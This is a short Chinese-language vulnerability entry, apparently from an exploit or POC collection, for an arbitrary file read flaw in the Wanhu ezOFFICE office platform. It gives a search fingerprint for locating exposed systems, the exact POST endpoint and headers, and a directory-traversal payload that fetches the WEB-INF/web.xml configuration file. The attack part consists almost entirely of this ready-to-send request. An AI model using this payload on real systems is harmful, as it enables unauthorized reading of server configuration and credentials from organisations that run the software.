# 万户协同办公平台ezofficeconvertFile存在任意文件读取漏洞

- **系统**：万户协同办公平台　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app.name="万户 Ezoffice OA"`
- **请求**：`POST /defaultroot/convertFile/text2Html.controller HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Content-Length: 63`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
saveFileName=123456/../../../../WEB-INF/web.xml&moduleName=html
```

**其他**
- 万户协同办公平台 ezoffice convertFile存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 万户ezoffice